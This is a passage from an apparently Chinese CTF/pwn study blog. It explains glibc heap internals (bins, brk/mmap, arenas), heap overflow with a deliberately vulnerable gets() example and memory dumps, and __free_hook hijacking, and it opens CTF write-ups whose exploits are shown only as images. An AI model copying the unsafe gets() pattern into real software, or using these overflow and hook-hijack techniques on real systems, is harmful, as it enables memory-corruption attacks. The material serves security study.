<h2 id="六、Small-Bin"><a href="#六、Small-Bin" class="headerlink" title="六、Small Bin"></a>六、Small Bin</h2><ul>
<li><strong>概念：</strong>小于1024字节（0x400）的chunk称之为small chunk，small bin就是用于管理small chunk的。</li>
<li>small bin链表的个数为62个。</li>
<li>就内存的分配和释放速度而言，small bin比larger bin快，但比fast bin慢。</li>
<li><strong>合并操作：</strong>相邻的free chunk需要进行合并操作，即合并成一个大的free chunk。具体操作见下文free(small chunk)介绍。</li>
</ul>
<h3 id="Small-Bin链表的特性"><a href="#Small-Bin链表的特性" class="headerlink" title="Small Bin链表的特性"></a>Small Bin链表的特性</h3><ul>
<li>每个smallbin也是一个由对应free chunk组成的循环双链表。</li>
<li><strong>small bin采用FIFO(先入先出)算法：</strong>内存释放操作就将新释放的chunk添加到链表的front end(前端)，分配操作就从链表的rear end(尾端)中获取chunk。</li>
<li>单个smallbin链表中的chunk大小都是相同的，各个smallbin链表中的chunk大小是不同的，跟fastbinsY数组存储fastbin链的原理是相同的。</li>
<li><strong>bins数组存储small bin链时：</strong>第一个small bin链中chunk的大小为32字节，后续每个small bin中chunk的大小依次增加两个机器字长（32位相差8字节，64位相差16字节）…….以此类推，跟fastbinsY数组存储fastbin链的原理是相同的（用下图表示）。</li>
<li><strong>bin链存储的大小与数组下标的关系：</strong>chun_size=2<em>SIZE_SZ</em>index。</li>
</ul>
<p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-f20921b235e39c6e13644572fdc8d0d7_720w.jpg"><span class="image-caption">img</span></p>
<h3 id="malloc操作与small-bin的初始化"><a href="#malloc操作与small-bin的初始化" class="headerlink" title="malloc操作与small bin的初始化"></a>malloc操作与small bin的初始化</h3><ul>
<li><p>类似于fast bins，最初所有的small bin都是空的，因此在对这些small bin完成初始化之前，即使用户请求的内存大小属于small chunk也不会交由small bin进行处理，而是交由unsorted bin处理。</p>
</li>
<li><p>如果unsorted bin也不能处理的话，glibc malloc就依次遍历后续的所有bins，找出第一个满足要求的bin，如果所有的bin都不满足的话，就转而使用top chunk，如果top chunk大小不够，那么就扩充top chunk，这样就一定能满足需求了。</p>
</li>
<li><p>注意遍历后续bins以及之后的操作同样被large bin所使用，因此，将这部分内容放到large bin的malloc操作中加以介绍。</p>
</li>
<li><p>那么glibc malloc是如何初始化这些bins的呢？因为这些bin属于malloc_state结构体，所以在初始化malloc_state的时候就会对这些bin进行初始化，代码如下：</p>
</li>
<li><ul>
<li>将bins数组中的第一个成员索引值设置为了1，而不是我们常用的0(在bin_at宏中，自动将i进行了减1处理)。</li>
<li>从下面代码可以看出在初始化的时候glibc malloc将所有bin的指针都指向了自己——这就代表这些bin都是空的。</li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">static void<br>malloc_init_state (mstate av)<br>&#123;<br>    int i;<br>    mbinptr bin;<br>    <br>    /* Establish circular links for normal bins */<br>    for (i = 1; i &lt; NBINS; ++i)<br>    &#123;<br>        bin = bin_at (av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin;<br>    &#125;<br> <br>    ......<br>&#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>过后，当再次调用malloc(small chunk)的时候，如果该chunk size对应的small bin不为空，就从该small bin链表中取得small chunk给malloc使用。</li>
</ul>
<h3 id="free操作-1"><a href="#free操作-1" class="headerlink" title="free操作"></a>free操作</h3><ul>
<li>small的free比较特殊。当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中，之后unsorted bin进行整理再添加到对应的bin链上（后面会有图介绍）。</li>
</ul>
<h2 id="七、Large-Bin"><a href="#七、Large-Bin" class="headerlink" title="七、Large Bin"></a>七、Large Bin</h2><ul>
<li><strong>概念：</strong>大于等于1024字节（0x400）的chunk称之为large chunk，large bin就是用于管理这些largechunk的。</li>
<li>large bin链表的个数为63个，被分为6组。</li>
<li>largechunk使用fd_nextsize、bk_nextsize连接起来的。</li>
<li><strong>合并操作：</strong>类似于small bin。</li>
</ul>
<h3 id="Large-Bin链表的特性"><a href="#Large-Bin链表的特性" class="headerlink" title="Large Bin链表的特性"></a>Large Bin链表的特性</h3><ul>
<li>同一个largebin中每个chunk的大小可以不一样，这些chunk根据一定的范围存储在一个larbin链表中。</li>
<li>large chunk可以添加、删除在large bin的任何一个位置。</li>
<li><strong>在这63个largebins中：第一组的32个largebin链</strong>依次以64字节步长为间隔，即第一个largebin链中chunksize为1024-1087字节，第二个large bin中chunk size为1088~1151字节。<strong>第二组的16个largebin链</strong>依次以512字节步长为间隔；<strong>第三组的8个largebin链</strong>以步长4096为间隔；<strong>第四组的4个largebin链</strong>以32768字节为间隔；<strong>第五组的2个largebin链</strong>以262144字节为间隔；<strong>最后一组</strong>的largebin链中的chunk大小无限制。</li>
</ul>
<p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-47264da3791b9433f4cde0589001089f_720w.jpg"><span class="image-caption">img</span></p>
<ul>
<li><strong>在同一个largebin中：</strong>每个chunk的大小不一定相同，因此为了加快内存分配和释放的速度，就将同一个largebin中的所有chunk按照chunksize进行<strong>从大到小</strong>的排列：最大的chunk放在一个链表的front end，最小的chunk放在rear end；相同大小的chunk按照最近使用顺序排序。</li>
</ul>
<h3 id="链表索引宏定义：（largebin-index）"><a href="#链表索引宏定义：（largebin-index）" class="headerlink" title="链表索引宏定义：（largebin_index）"></a>链表索引宏定义：（largebin_index）</h3><ul>
<li>参数为链表能存储的chunk大小，宏定义中有简介调用其他宏定义。</li>
<li>例如：第一个largebin的起始大小为1024，那么1024&gt;&gt;6=16，所以其在bins数组中的下标为48+16=64。</li>
</ul>
<p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-37630d6c2b179946ced49927b69d94d9_720w.jpg"><span class="image-caption">img</span></p>
<h3 id="malloc操作与large-bin的初始化"><a href="#malloc操作与large-bin的初始化" class="headerlink" title="malloc操作与large bin的初始化"></a>malloc操作与large bin的初始化</h3><ul>
<li><p>初始化完成之前的操作类似于small bin。</p>
</li>
<li><p>下面讨论large bins初始化完成之后的操作：</p>
</li>
<li><ul>
<li>首先确定用户请求的大小属于哪一个large bin，然后判断该large bin中最大的chunk的size是否大于用户请求的size(只需要对比链表中front end的size即可)。如果大于，就从rear end开始遍历该large bin，找到第一个size相等或接近的chunk，分配给用户。如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者返回给用户，且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中。</li>
<li>如果该large bin中最大的chunk的size小于用户请求的size的话，那么就依次查看后续的large bin中是否有满足需求的chunk，不过需要注意的是鉴于bin的个数较多(不同bin中的chunk极有可能在不同的内存页中)，如果按照上一段中介绍的方法进行遍历的话(即遍历每个bin中的chunk)，就可能会发生多次内存页中断操作，进而严重影响检索速度，所以glibc malloc设计了Binmap结构体来帮助提高bin-by-bin检索的速度。Binmap记录了各个bin中是否为空，通过bitmap可以避免检索一些空的bin。如果通过binmap找到了下一个非空的large bin的话，就按照上一段中的方法分配chunk，否则就使用top chunk来分配合适的内存。</li>
</ul>
</li>
</ul>
<p><strong>free操作</strong></p>
<ul>
<li>类似于small chunk。</li>
</ul>
<p><img src="/2021/04/11/2021-04-11-Chunk%E4%B8%8EBins%E5%88%86%E7%B1%BB/v2-074b7317613db621519df68372bc2373_720w.jpg"><span class="image-caption">img</span></p>
]]></content>
  </entry>
  <entry>
    <title>初探堆</title>
    <url>/2021/04/10/2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86/</url>
    <content><![CDATA[<h1 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h1><h4 id="知识来源处："><a href="#知识来源处：" class="headerlink" title="知识来源处："></a>知识来源处：</h4><ul>
<li>CTF pwn 中最通俗易懂的堆入坑指南<a href="https://www.anquanke.com/post/id/163971">https://www.anquanke.com/post/id/163971</a></li>
<li>CTF Wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/">https://wiki.x10sec.org/pwn/linux/glibc-heap/heap_overview-zh/</a></li>
</ul>
<h3 id="linux下的堆"><a href="#linux下的堆" class="headerlink" title="linux下的堆"></a>linux下的堆</h3><p>堆不同于栈，堆是动态分配的（由操作系统内核或者堆管理器），只有在程序中需要时才会分配。栈是程序加载进内存后就会出现，而堆是由 malloc、alloc、realloc 函数分配内存后才会出现。</p>
<p>堆其实就是程序虚拟地址空间的一块连续的线性区域，其生长方向是从<strong>低地址向高地址生长的</strong>，与栈的从高地址向低地址生长是不同的。内核一般都会预先分配很大的一块连续的内存，因此堆可以申请到的内存空间比栈要大很多，然后让堆管理器通过某种算法管理这块内存。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为如果程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p>
<p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
<h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">函数原型<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">brk</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *addr)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">intptr_t</span> increment)</span></span>;<br></code></pre></td></tr></table></figure>

<p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk的大小来向操作系统申请内存。</p>
<p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p>
<ul>
<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li>
<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li>
</ul>
<p>brk和sbrk会改变program break的位置(在heap后的那块区域)，brk通过传递的addr来重新设置program break，成功则返回0，否则返回-1。而sbrk用来增加heap，增加的大小通过参数increment决定，返回增加大小<strong>前</strong>的heap的program break，如果increment为0则返回program break</p>
<p>大部分我们使用的是malloc和free函数来分配和释放内存，而brk和sbrk分配的堆空间类似于缓冲池（这个缓冲池的大小比malloc所设置的更大），每次malloc从缓冲池获得内存，如果缓冲池不够了，再调用brk或sbrk扩充缓冲池，直到达到缓冲池大小的上限，free则将应用程序使用的内存空间归还给缓冲池。</p>
<p><img src="2021-04-10-%E5%88%9D%E6%8E%A2%E5%A0%86.assets/program_virtual_address_memory_space.png"></p>
<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 mmap 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p>
<p>可以用munmap函数清除mmap的匿名映射段</p>
<h4 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h4><p><strong>许多时候程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p>
<p><strong>在主线程释放内存后</strong>，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p>
<p>注：当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p>
<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>（转载自ctf-wiki<a href="https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/%EF%BC%89">https://wiki.x10sec.org/pwn/linux/glibc-heap/heapoverflow_basic-zh/）</a></p>
<p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
<p>不难发现，堆溢出漏洞发生的基本前提是</p>
<ul>
<li>程序向堆上写入数据。</li>
<li>写入的数据大小没有被良好地控制。</li>
</ul>
<p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。</p>
<p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等）。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p>
<ol>
<li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容。<ul>
<li>  prev_size</li>
<li>size，主要有三个比特位，以及该堆块真正的大小。<ul>
<li>  NON_MAIN_ARENA </li>
<li>  IS_MAPPED  </li>
<li>  PREV_INUSE </li>
<li>  the True chunk size</li>
</ul>
</li>
<li>  chunk content，从而改变程序固有的执行流。</li>
</ul>
</li>
<li> 利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li>
</ol>
<h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>下面我们举一个简单的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main(void) <br>&#123;<br>  char *chunk;<br>  chunk=malloc(24);<br>  puts(&quot;Get input:&quot;);<br>  gets(chunk);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中(实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk)。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">0x602000:	0x0000000000000000	0x0000000000000021 &lt;===chunk<br>0x602010:	0x0000000000000000	0x0000000000000000<br>0x602020:	0x0000000000000000	0x0000000000020fe1 &lt;===top chunk<br>0x602030:	0x0000000000000000	0x0000000000000000<br>0x602040:	0x0000000000000000	0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>print ‘A’*100<br>进行写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">0x602000:	0x0000000000000000	0x0000000000000021 &lt;===chunk<br>0x602010:	0x4141414141414141	0x4141414141414141<br>0x602020:	0x4141414141414141	0x4141414141414141 &lt;===top chunk(已被溢出)<br>0x602030:	0x4141414141414141	0x4141414141414141<br>0x602040:	0x4141414141414141	0x4141414141414141<br></code></pre></td></tr></table></figure>


<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>堆溢出中比较重要的几个步骤:</p>
<h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">calloc(0x20);<br>//等同于<br>ptr=malloc(0x20);<br>memset(ptr,0,0x20);<br></code></pre></td></tr></table></figure>

<p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main(void) <br>&#123;<br>  char *chunk,*chunk1;<br>  chunk=malloc(16);<br>  chunk1=realloc(chunk,32);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p>
<ul>
<li>当realloc(ptr,size)的size不等于ptr的size时<ul>
<li>如果申请size&gt;原来size<ul>
<li>  如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li>
<li>  如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size) </li>
</ul>
</li>
<li>如果申请size&lt;原来size<ul>
<li>  如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li>
<li>  如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li>
</ul>
</li>
</ul>
</li>
<li>  当realloc(ptr,size)的size等于0时，相当于free(ptr)</li>
<li>  当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li>
</ul>
<h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。</p>
<p>常见的危险函数如下</p>
<ul>
<li>输入<ul>
<li>  gets，直接读取一行，忽略 <code>&#39;\x00&#39;</code></li>
<li>  scanf</li>
<li>  vscanf</li>
</ul>
</li>
<li>输出<ul>
<li>  sprintf</li>
</ul>
</li>
<li>字符串<ul>
<li>  strcpy，字符串复制，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>  strcat，字符串拼接，遇到 <code>&#39;\x00&#39;</code> 停止</li>
<li>  bcopy，将字符串src的前n个字节复制到dest中，并且不检查’\x00’</li>
</ul>
</li>
</ul>
<h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。<br>一个常见的误区是malloc的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的2倍，比如32位系统是8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行<code>malloc(0)</code>会返回用户区域为16字节的块。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main(void) <br>&#123;<br>  char *chunk;<br>  chunk=malloc(0);<br>  puts(&quot;Get input:&quot;);<br>  gets(chunk);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//根据系统的位数，malloc会分配8或16字节的用户空间<br>0x602000:	0x0000000000000000	0x0000000000000021<br>0x602010:	0x0000000000000000	0x0000000000000000<br>0x602020:	0x0000000000000000	0x0000000000020fe1<br>0x602030:	0x0000000000000000	0x0000000000000000<br></code></pre></td></tr></table></figure>

<p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size=用户区域大小+2*字长</p>
<p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个chunk的prev_size字段储存内容。回头再来看下之前的示例代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br><br>int main(void) <br>&#123;<br>  char *chunk;<br>  chunk=malloc(24);<br>  puts(&quot;Get input:&quot;);<br>  gets(chunk);<br>  return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>观察如上代码，我们申请的chunk大小是24个字节。但是我们将其编译为64位可执行程序时，实际上分配的内存会是16个字节而不是24个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">0x602000:	0x0000000000000000	0x0000000000000021<br>0x602010:	0x0000000000000000	0x0000000000000000<br>0x602020:	0x0000000000000000	0x0000000000020fe1<br></code></pre></td></tr></table></figure>

<p>16个字节的空间是如何装得下24个字节的内容呢？答案是借用了下一个块的pre_size域。我们可来看一下用户申请的内存大小与glibc中实际分配的内存大小之间的转换。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* pad request bytes into a usable size -- internal version */</span><br><span class="hljs-comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> request2size(req)                                                      \</span><br><span class="hljs-meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span><br><span class="hljs-meta">         ? MINSIZE                                                             \</span><br><span class="hljs-meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure>

<p>当req=24时，request2size(24)=32。而除去chunk 头部的16个字节。实际上用户可用chunk的字节数为16。而根据我们前面学到的知识可以知道chunk的pre_size仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个chunk的prev_size字段，正好24个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以64位系统为例，分配出来的空间是16的整数倍，即用户申请的chunk都是16字节对齐的。</strong></p>
<h2 id="相关函数知识"><a href="#相关函数知识" class="headerlink" title="相关函数知识"></a>相关函数知识</h2><p>1、<strong>mmap</strong></p>
<p>函数原型为<em><em>void</em> mmap(void</em> start,size_t length,int prot,int flags,int fd,off_t offset)**  功能为：mmap将一个文件或者其它对象映射进内存。文件被<strong>映射</strong>到多个页上，如果文件的大小不是所有页的大小之和，最后一个页剩下的空间（未使用的）将会清零。mmap创建的chunk紧邻libc</p>
<p>条件：mmap()必须以PAGE_SIZE为单位进行映射，而内存也只能以页为单位（32位系统中页为4k字节）进行映射，若要映射非PAGE_SIZE整数倍的地址范围，要先进行内存对齐，强行以PAGE_SIZE的倍数大小进行映射。</p>
<p>参数说明：</p>
<p>start：映射区的开始地址，设置为0时表示由系统决定映射区的起始地址。</p>
<p>length：映射区的长度。//长度单位是 以字节为单位，不足一内存页按一内存页处理</p>
<p>prot：期望的内存保护标志，不能与文件的打开模式冲突。是以下的某个值，可以通过or运算合理地组合在一起</p>
<p>PROT_EXEC //页内容可以被执行（值为1）</p>
<p>PROT_READ //页内容可以被读取（值为4）</p>
<p>PROT_WRITE //页可以被写入（值为2）</p>
<p>PROT_NONE //页不可访问</p>
<p>flags：指定映射对象的类型，映射选项和映射页是否可以共享。它的值可以是一个或者多个以下位的组合体：</p>
<p>MAP_FIXED //使用指定的映射起始地址，如果由start和len参数指定的内存区重叠于现存的映射空间，重叠部分将会被丢弃。如果指定的起始地址不可用，操作将会失败。并且起始地址必须落在页的边界上。</p>
<p>MAP_SHARED //与其它所有映射这个对象的进程共享映射空间。对共享区的写入，相当于输出到文件。直到**msync()<strong>或者</strong>munmap()**被调用，文件实际上不会被更新。</p>
<p>MAP_PRIVATE //建立一个写入时拷贝的私有映射。内存区域的写入不会影响到原文件。这个标志和以上标志是互斥的，只能使用其中一个。</p>
<p>MAP_DENYWRITE //这个标志被忽略。</p>
<p>MAP_EXECUTABLE //同上</p>
<p>MAP_NORESERVE //不要为这个映射保留交换空间。当交换空间被保留，对映射区修改的可能会得到保证。当交换空间不被保留，同时内存不足，对映射区的修改会引起段违例信号。</p>
<p>MAP_LOCKED //锁定映射区的页面，从而防止页面被交换出内存。</p>
<p>MAP_GROWSDOWN //用于堆栈，告诉内核VM系统，映射区可以向下扩展。</p>
<p>MAP_ANONYMOUS //匿名映射，映射区不与任何文件关联。</p>
<p>MAP_ANON //MAP_ANONYMOUS的别称，不再被使用。</p>
<p>MAP_FILE //兼容标志，被忽略。</p>
<p>MAP_32BIT //将映射区放在进程地址空间的低2GB，MAP_FIXED指定时会被忽略。当前这个标志只在x86-64平台上得到支持。</p>
<p>MAP_POPULATE //为文件映射通过预读的方式准备好页表。随后对映射区的访问不会被页违例阻塞。</p>
<p>MAP_NONBLOCK //仅和MAP_POPULATE一起使用时才有意义。不执行预读，只为已存在于内存中的页面建立页表入口。</p>
<p>fd：有效的文件描述词。一般是由**open()**函数返回，其值可以设置为-1，此时需要指定flags参数中的MAP_ANONYMOUS，表明进行的是匿名映射。</p>
<p>offset：被映射对象内容的起点。</p>
<p>成功执行时，mmap()返回被映射区的指针，munmap()返回0。失败时，mmap()返回MAP_FAILED[其值为(void *)-1]，munmap返回-1。</p>
<p>注：（（void*）-1） ：一个某类型指针类型，指向地址为0xffffffff，无效地址，表明错误</p>
<p>映射建立之后，即使文件关闭，映射依然存在。因为映射的是磁盘的地址，不是文件本身，和文件句柄无关。同时可用于进程间通信的有效地址空间不完全受限于被映射文件的大小，因为是按页映射。</p>
<p>2、<strong>munmap</strong></p>
<p>函数原型为<em><em>int munmap(void</em> start,size_t length)</em>* 用来取消参数start所指的映射内存起始地址，参数length则是欲取消的内存大小。当进程结束或利用exec相关函数来执行其他程序时，映射内存会自动解除，但关闭对应的文件描述符时不会解除映射。</p>
<p>addr是调用mmap()时返回的地址，len是映射区的大小；当映射关系解除后，对原来映射地址的访问将导致段错误发生。 </p>
<p>3、<strong>msync</strong></p>
<p>函数原型为**int msync( void *addr, size_t len, int flags )**，一般说来，进程在映射空间的对共享内容的改变并不直接写回到磁盘文件中，往往在调用munmap（）后才执行该操作。</p>
<p>可以通过调用msync()实现磁盘上文件内容与共享内存区的内容一致。</p>
<p>4、<strong>malloc</strong></p>
<p>函数原型为**void *malloc(unsigned int size)**；其作用是在内存的动态存储区中分配一个长度为size的连续空间。此函数的返回值是分配区域的起始地址，或者说，此函数是一个指针型函数，返回的指针指向该分配域的开头位置。</p>
<p>分配成功则返回指向被分配内存的指针(此存储区中的初始值不确定)，否则返回空指针NULL。当动态内存不再使用时，应使用free()函数将内存块释放。</p>
<ul>
<li>当 size=0 时，返回当前系统允许的堆的最小内存块。</li>
<li>当 size 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li>
</ul>
<p>5、<strong>free</strong></p>
<p>函数原型为**void free(void *ptr) **是C语言中释放内存空间的函数，通常与申请内存空间的函数malloc()结合使用，可以释放由 malloc()、calloc()、realloc() 等函数申请的内存空间。</p>
<p>ptr– 指针指向一个要释放内存的内存块，该内存块之前是通过调用 malloc、calloc 或 realloc 进行分配内存的。如果传递的参数是一个空指针，则不会执行任何动作。free函数不返回任何值</p>
<p>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code></p>
<p>6、**__free_hook**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">void __libc_free (void *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          /* chunk corresponding to mem */<br><br>  void (*hook) (void *, const void *)<br>    = atomic_forced_read (__free_hook);<br>  if (__builtin_expect (hook != NULL, 0))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (0));<br>      return;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>上面的代码对是 free() 函数的一部分，可以看出程序先把全局变量 __free_hook 赋给了局部变量 hook ，然后对 hook 是否为 NULL 进行判断，如果不为空，则执行 hook ，第一个参数就是 chunk 的内容部分。</p>
<p>一般的情况下 __free_hook 是为 NULL 的，所以是不会执行的，但是如果有人恶意修改 __free_hook 的话，就会造成 __free_hook 劫持</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>buu03</title>
    <url>/2021/04/07/2021-04-07-buu03/</url>
    <content><![CDATA[<h1 id="buu——pwn学习"><a href="#buu——pwn学习" class="headerlink" title="buu——pwn学习"></a>buu——pwn学习</h1><h3 id="十、铁人三项-第五赛区-2018-rop"><a href="#十、铁人三项-第五赛区-2018-rop" class="headerlink" title="十、铁人三项(第五赛区)_2018_rop"></a>十、铁人三项(第五赛区)_2018_rop</h3><p>checksec一下，开启了nx保护，然后拖入ida</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407213546.png"></p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407213807.png"></p>
<p>呃。。。应该就是比较熟悉的rop的构建了，直接上exp吧，这类题目做挺多的了：</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407220012.png"></p>
<h3 id="十一、gyctf-2020-borrowstack"><a href="#十一、gyctf-2020-borrowstack" class="headerlink" title="十一、gyctf_2020_borrowstack"></a>十一、gyctf_2020_borrowstack</h3><p>先做下这题，一直想完整的了解栈迁移，借着这题真正的掌握栈迁移的手法和知识点吧，先checksec一下，再拖入ida分析</p>
<p><img src="2021-04-07-buu03.assets/QQ%E5%9B%BE%E7%89%8720210407220304.png"></p>
